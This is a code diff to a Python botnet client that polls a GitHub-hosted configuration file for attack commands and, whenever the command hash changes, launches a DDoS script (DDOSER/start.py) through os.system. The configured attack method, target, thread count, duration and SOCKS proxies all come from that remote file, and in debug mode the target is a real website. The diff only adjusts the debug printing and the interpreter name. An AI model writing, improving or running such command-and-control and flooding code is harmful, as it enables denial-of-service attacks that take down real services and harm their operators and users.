@@ -9,7 +9,6 @@ from time import sleep
 DEBUG = True
 METHOD,TARGET,THREADS,DURATION,SOCKS_TYPE,HASH = '','','','','','-1'
 
-
 def get_config():
     global METHOD,TARGET,THREADS,DURATION,SOCKS_TYPE,HASH
     CONFIG_FILE = 'https://raw.githubusercontent.com/DenysDanov/botnet/main/cfg.json'
@@ -25,8 +24,8 @@ hash = ""
 while True:
     sleep(5)
     get_config()
-    if DEBUG: print(f'python DDOSER/start.py {METHOD}  {"jw.org" if DEBUG else TARGET} {THREADS} {DURATION} {SOCKS_TYPE} socks{SOCKS_TYPE}.txt')
     if hash != HASH:
         hash = HASH
-        os.system(f'python DDOSER/start.py {METHOD} {"jw.org" if DEBUG else TARGET} {THREADS} {DURATION} {SOCKS_TYPE} socks{SOCKS_TYPE}.txt {"true" if DEBUG else ""}')
+        if DEBUG: print(f'python{"3" if os.name == "posix" else ""} DDOSER/start.py {METHOD}  {"jw.org" if DEBUG else TARGET} {THREADS} {DURATION} {SOCKS_TYPE} socks{SOCKS_TYPE}.txt')
+        os.system(f'python{"3" if os.name == "posix" else ""} DDOSER/start.py {METHOD} {"jw.org" if DEBUG else TARGET} {THREADS} {DURATION} {SOCKS_TYPE} socks{SOCKS_TYPE}.txt {"true" if DEBUG else ""}')
     
